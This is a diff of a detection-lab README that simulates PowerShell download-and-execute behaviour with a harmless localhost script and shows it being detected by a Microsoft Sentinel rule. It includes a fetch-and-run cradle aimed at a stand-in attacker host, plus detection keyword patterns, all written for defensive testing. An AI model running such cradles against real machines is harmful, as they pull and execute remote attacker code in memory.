@@ -299,105 +299,338 @@ Alert Details:
 
 3. DownloadString and Invoke-Expression Pattern
 
-Attack Scenario
+# PowerShell DownloadString and Invoke-Expression (IEX) Attack Simulation
 
-Attackers may use PowerShell to download remote content and execute it directly in memory.
+## Overview
 
-This technique is commonly seen during malware delivery.
+This  explains the simulation of suspicious PowerShell download and execution behavior.
 
-Command Pattern
+Attackers commonly abuse PowerShell after gaining access to a Windows machine.
 
-(New-Object Net.WebClient).DownloadString("URL")
+The goal of this simulation was to replicate attacker behavior where PowerShell downloads remote content and executes it.
 
-Used with:
+This detection focuses on:
 
-Invoke-Expression
+- PowerShell execution
+- Remote content download
+- In-memory execution using Invoke-Expression (IEX)
 
-or:
-
-IEX
-
-Explanation
-
-DownloadString:
-
-Downloads content from a remote location.
-
-Invoke-Expression:
-
-Executes the downloaded PowerShell content.
-
-Attack flow:
-
-Download content
-
-↓
-
-Load into memory
-
-↓
-
-Execute command
-
-Attackers use this because files may not be saved on disk, making detection harder.
 
 MITRE ATT&CK:
 
-T1059.001 - PowerShell
-
-T1105 - Ingress Tool Transfer
-
-
----
-
-Detection Validation
-
-All simulations generated Windows process creation telemetry.
-
-Data flow:
-
-Windows VM
-
-↓
-
-Azure Monitor Agent (AMA)
-
-↓
-
-Data Collection Rule (DCR)
-
-↓
-
-Log Analytics Workspace
-
-↓
-
-Microsoft Sentinel
-
-↓
-
-Analytics Rule
-
-↓
-
-Alert
-
-↓
-
-Incident
+- T1059.001 - Command and Scripting Interpreter: PowerShell
+- T1105 - Ingress Tool Transfer
 
 
 ---
 
-Final Result
+# Attack Simulation
 
-Successfully simulated common PowerShell abuse techniques:
-
-1. Execution Policy Bypass
+## Step 1: Create PowerShell Script Files
 
 
-2. Encoded PowerShell Execution
+Created sample PowerShell files inside:
+
+C:\Temp
+
+Files created:
+
+TestScript.ps1 Welcome.ps1
+
+The .ps1 extension represents a PowerShell script file.
+
+A PowerShell script contains commands that are executed by the PowerShell engine.
 
 
-3. Download and Execute Behavior
+---
 
+# TestScript.ps1 Content
+
+
+```powershell
+Write-Output "DownloadString Test Executed Successfully"
+
+<img width="1917" height="290" alt="image" src="https://github.com/user-attachments/assets/b6475ca8-74e5-44af-b637-22408f1ae63e" />
+
+
+
+Explanation
+
+The script contains a harmless PowerShell command.
+
+When executed, it prints:
+
+DownloadString Test Executed Successfully
+
+This was created only to simulate downloaded content safely.
+
+
+---
+
+Welcome.ps1 Content
+
+whoami
+
+<img width="1632" height="255" alt="image" src="https://github.com/user-attachments/assets/5d4cae5a-841b-4e3a-b010-d9fe01b5077f" />
+
+
+Explanation
+
+This command displays the current user context.
+
+Attackers commonly perform discovery commands after gaining access to understand:
+
+Current user
+
+Privileges
+
+Machine context
+
+
+
+---
+
+Step 2: Start Python HTTP Server
+
+Command executed:
+
+python -m http.server 8000
+
+Why was this used?
+
+Python HTTP server converts the current folder into a temporary web server.
+
+The VM starts serving files from the folder where the command is executed.
+
+Example:
+
+C:\Temp
+
+ |
+ |--- TestScript.ps1
+ |
+ |--- Welcome.ps1
+
+After starting the server:
+
+http://localhost:8000
+
+The files become available through HTTP.
+
+The Windows VM is acting as a temporary server hosting PowerShell files.
+
+<img width="1378" height="185" alt="image" src="https://github.com/user-attachments/assets/dbdcfc2e-9cd2-4ea3-93d6-64a367894c54" />
+
+
+
+---
+
+Step 3: Verify Hosted Files
+
+Opened in browser:
+
+http://localhost:8000
+
+The hosted files were visible:
+
+TestScript.ps1
+Welcome.ps1
+
+<img width="1917" height="420" alt="image" src="https://github.com/user-attachments/assets/9eddadc2-4626-48b2-b840-8846621e5a40" />
+
+
+This confirms that the HTTP server is successfully serving the files.
+
+
+---
+
+Step 4: Execute Download and Execution Command
+
+Command executed:
+
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString('http://localhost:8000/TestScript.ps1')"
+
+<img width="1592" height="146" alt="image" src="https://github.com/user-attachments/assets/ee6e1e67-f7d5-4194-99f1-79de29b38063" />
+
+
+
+---
+
+Command Explanation
+
+powershell.exe
+
+Starts the PowerShell process.
+
+Attackers abuse PowerShell because it is a built-in Windows tool that can:
+
+Execute commands
+
+Run scripts
+
+Download content
+
+Perform system discovery
+
+
+
+---
+
+New-Object Net.WebClient
+
+Creates a web client object.
+
+It allows PowerShell to communicate with a URL and retrieve content.
+
+
+---
+
+DownloadString()
+
+Downloads the content from the provided URL as text.
+
+Example:
+
+http://localhost:8000/TestScript.ps1
+
+PowerShell downloads the script content into memory.
+
+
+---
+
+IEX (Invoke-Expression)
+
+Executes the downloaded PowerShell content.
+
+Execution flow:
+
+Download Script
+
+        |
+
+Read Script Content
+
+        |
+
+Invoke-Expression Executes Content
+
+Output:
+
+DownloadString Test Executed Successfully
+
+This confirms the script was downloaded and executed successfully.
+
+
+---
+
+Attacker Abuse Explanation
+
+In a real attack scenario:
+
+The attacker hosts a malicious PowerShell script on their own server.
+
+Example:
+
+Attacker Server
+
+malicious.ps1
+
+The victim machine runs:
+
+IEX(New-Object Net.WebClient).DownloadString('http://attacker-server/malicious.ps1')
+
+Attack flow:
+
+Attacker Server
+
+        |
+
+        |
+
+        v
+
+Victim Windows Machine
+
+        |
+
+        |
+
+PowerShell downloads script
+   |
+
+        |
+
+IEX executes script
+
+The victim machine connects to the attacker-controlled server and downloads the content.
+
+
+---
+
+Why Attackers Use This Technique
+
+Attackers use DownloadString + IEX because:
+
+Script can execute without saving a file
+
+Content can run directly in memory
+
+Helps avoid simple file-based detection
+
+Allows remote execution of PowerShell code
+
+
+---
+
+Sentinel Detection Logic
+
+The analytics rule checks for suspicious PowerShell patterns:
+
+powershell.exe
+
+DownloadString
+
+IEX
+
+Invoke-Expression
+
+If these patterns appear in the command line, Sentinel creates an alert.
+
+
+Logs
+<img width="1919" height="796" alt="image" src="https://github.com/user-attachments/assets/8f6a414e-aa83-4ea4-92f4-c6165e1a9965" />
+
+
+Incident Created
+
+<img width="1919" height="814" alt="image" src="https://github.com/user-attachments/assets/eec3b24a-7379-401b-9a17-b24aeb219c96" />
+
+Incident Details
+
+<img width="1919" height="881" alt="image" src="https://github.com/user-attachments/assets/87283af2-3618-47c5-a391-e417b9155bb7" />
+
+Investigation:
+<img width="1919" height="809" alt="image" src="https://github.com/user-attachments/assets/e7474d0e-251f-402d-bc33-b4c92eb4eea1" />
+
+
+
+
+ALert Created
+<img width="1623" height="793" alt="image" src="https://github.com/user-attachments/assets/fb12f0b6-88aa-4143-a973-af6941681eb0" />
+
+
+---
+---
+
+Result
+
+Successfully simulated:
+
+PowerShell remote content download
+
+PowerShell execution
+
+Invoke-Expression behavior
+
+
+The activity was detected through Microsoft Sentinel analytics rule and generated an alert/incident.
